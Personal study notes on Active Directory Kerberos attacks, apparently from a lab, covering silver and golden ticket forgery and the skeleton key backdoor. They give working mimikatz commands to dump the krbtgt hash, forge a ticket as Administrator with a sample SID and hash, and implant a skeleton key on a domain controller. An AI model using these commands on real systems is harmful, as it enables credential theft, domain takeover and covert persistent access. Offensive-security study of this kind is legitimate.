
https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden

### Silver ticket - 

SQL Example - User

"You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server."


### Golden ticket - use krbtgt hash to get any creds

Requirements:
domain:        domain.com
domain sid:  used sid minus the last bit
krbtgt hash:   (requires dc sync or similar permissions to get)

The krbtgt account is always disabled as it's not used for login.
Getting the krbtgt hash through [[Tools/mimikatz]] `lsadump::dcsync` or [[Tools/impacket-secretsdump]] for example

---

`lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

`mimikatz.exe "lsadump::lsa /inject /name:krbtgt"`

gold - grab domain sid, ntlm hash and use the id 500
`Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500`

silver -                                                         service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the use the id (ex 1103)
`Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`

---
---

### Skeleton key

"A Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption."

default hash is _60BA4FCADC466C7A033C178194C03DF6_ which makes the password "mimikatz"

"The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest."

command for instlling the skeleton key backdoor:
`misc::skeleton`


